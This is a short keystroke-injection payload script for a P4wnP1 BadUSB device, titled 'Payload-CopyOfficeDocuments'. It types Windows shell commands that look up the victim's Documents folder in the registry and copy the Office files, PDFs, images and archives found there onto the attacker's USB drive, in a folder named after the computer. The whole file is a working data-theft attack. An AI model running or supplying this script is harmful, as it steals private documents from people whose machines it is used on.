// WIN-C02--Payload-CopyOfficeDocuments.js
// Version: 2023-06-08--001


// Set keyboard layout to German (DE)
layout('DE');
typingSpeed(0,0);
delay(3000);

// Clear screen
type("cls");
press("RETURN");


// Create directory for dumps on virtual P4wnP1 USB drive
type("set DumpPath=\"%DriveLetter%/%COMPUTERNAME%/documents\"");
press("RETURN");
type("mkdir %DumpPath%");
press("RETURN");


// Copy office documents
// Read document path from registry and save it in environment variable
type("for /f \"tokens=3 skip=2\" %i in ('REG QUERY \"HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\" /v Personal') do set \"Documents=%i\"");
press("RETURN");
delay(700);

type("for %i in (doc, ppt, xls, zip, pdf, png, jpg) do copy /y %Documents%\\*.%i? %DumpPath%");
press("RETURN");
delay(700);
